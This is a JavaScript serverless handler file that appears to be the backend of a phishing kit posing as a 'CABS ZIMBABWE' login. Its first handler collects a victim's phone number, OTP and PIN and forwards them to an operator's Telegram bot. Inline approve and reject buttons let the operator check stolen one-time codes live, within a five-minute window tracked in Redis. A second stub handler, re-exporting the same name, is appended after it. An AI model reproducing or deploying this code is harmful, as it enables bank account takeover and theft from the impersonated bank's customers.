const { Redis } = require("@upstash/redis");

exports.handler = async (event, context) => {
    // Handle OPTIONS for CORS
    if (event.httpMethod === "OPTIONS") {
        return {
            statusCode: 204,
            headers: {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Methods": "POST, OPTIONS",
                "Access-Control-Allow-Headers": "Content-Type",
            },
            body: ""
        };
    }

    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        const body = JSON.parse(event.body || "{}");
        const { type, phone, details, otp, pin } = body;

        if (!phone) {
            return {
                statusCode: 400,
                headers: { "Access-Control-Allow-Origin": "*" },
                body: JSON.stringify({ error: "Phone number is required" }),
            };
        }

        // Initialize Redis Client
        const redis = new Redis({
            url: process.env.UPSTASH_REDIS_REST_URL || "",
            token: process.env.UPSTASH_REDIS_REST_TOKEN || "",
        });

        // Generate a random attempt ID
        const attemptId = Math.random().toString(36).substring(2, 15);

        // Store status as pending with expiration (e.g., 5 minutes)
        await redis.set(`attempt:${attemptId}`, "pending", { ex: 300 });

        // Send to Telegram
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (botToken && chatId) {
            const now = new Date();
            const timeString = now.toLocaleString('en-US', { timeZone: 'Africa/Harare' });
            
            const titlePrefix = (type || 'LOGIN').toUpperCase();
            
            let messageDetails = '';
            if (details) messageDetails += `\n*Details:* \`${details}\``;
            if (otp) messageDetails += `\n🔑 *OTP:* \`${otp}\``;
            if (pin) messageDetails += `\n🔑 *PIN:* \`${pin}\``;

            const message = `✅ *CABS ZIMBABWE — ${titlePrefix}*

🆕 *NEW USER*
🌍 *Country:* +263 (ZWE)
📞 *Number:* ${phone.replace(/^\+?263/, '')}${messageDetails}
⏰ *Time:* ${timeString}

-------------------------
⏱ *Timeout:* 5 min

_Attempt ID: ${attemptId}_`;
            
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            await fetch(telegramUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Correct", callback_data: `approve_${attemptId}` }
                            ],
                            [
                                { text: "❌ Wrong Code", callback_data: `reject_${attemptId}` },
                                { text: "⚠️ Wrong PIN", callback_data: `reject_${attemptId}` }
                            ]
                        ]
                    }
                }),
            });
        }

        return {
            statusCode: 200,
            headers: { "Access-Control-Allow-Origin": "*" },
            body: JSON.stringify({ attemptId, status: "pending" }),
        };
    } catch (error) {
        console.error("Callback Error:", error);
        return {
            statusCode: 500,
            headers: { "Access-Control-Allow-Origin": "*" },
            body: JSON.stringify({ error: "Internal Server Error" }),
        };
    }
};
exports.handler = async (event) => {
  try {
    const body = JSON.parse(event.body);
    const attemptId = `attempt_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // TODO: Implement your actual login logic here
    console.log('Login attempt:', body.phone);
    
    return {
      statusCode: 200,
      body: JSON.stringify({ attemptId })
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};
